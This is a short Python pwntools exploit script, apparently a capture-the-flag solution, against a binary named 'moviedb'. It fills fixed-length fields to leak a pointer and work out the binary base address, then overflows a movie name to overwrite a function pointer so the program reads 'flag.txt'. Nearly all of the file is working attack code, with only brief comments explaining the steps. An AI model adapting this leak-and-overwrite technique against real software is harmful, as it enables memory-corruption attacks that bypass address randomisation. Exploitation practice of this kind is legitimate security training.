from pwn import *

MAX_MOVIE_NAME_LEN = 40
MAX_MOVIE_DESCRIPTION_LEN = 512

s = process('./moviedb')
s.readuntil('>')

### STEP 1 ###

s.sendline('1')
s.sendafter('Name: ', 'A' * MAX_MOVIE_NAME_LEN)
s.sendafter('Description: ', 'A' * MAX_MOVIE_DESCRIPTION_LEN)
s.sendlineafter('Year: ', str(0xffffffff))
s.sendlineafter('Duration: ', str(0xffffffff))
s.sendlineafter('> ', '4')

data = s.readuntil(p64(0xffffffffffffffff)) 
bin_base = u64(s.read(6).ljust(8, '\x00')) - 0x12b0
print '[*] Binary base address: 0x%016x' % bin_base
s.readuntil('>')


### STEP 2 ####

# Add a new movie (note that we cannot edit the old movie since the program does not find it due to the invalid name)
s.sendline('1')
s.sendlineafter('Name: ', 'Title')
s.sendlineafter('Description: ', 'XXXX')
s.sendlineafter('Year: ', '42')
s.sendlineafter('Duration: ', '42')
s.sendlineafter('> ', '4')

# Overflow function pointer
s.sendline('3')
s.sendlineafter('Name: ', 'Title')
s.sendlineafter('New name: ', p64(bin_base + 0xee0) * 8)
s.sendlineafter('New description: ', 'flag.txt')
s.sendlineafter('New duration: ', '42')
s.sendlineafter('New year: ', '42')

# Print movie and read the flag. Note that we use s.interactive() here because the program crashes afterwards and this
# is a simple way to retrieve all program output (normally s.interactive() is used to get an interactive shell).
s.sendlineafter('> ', '4')
s.interactive()

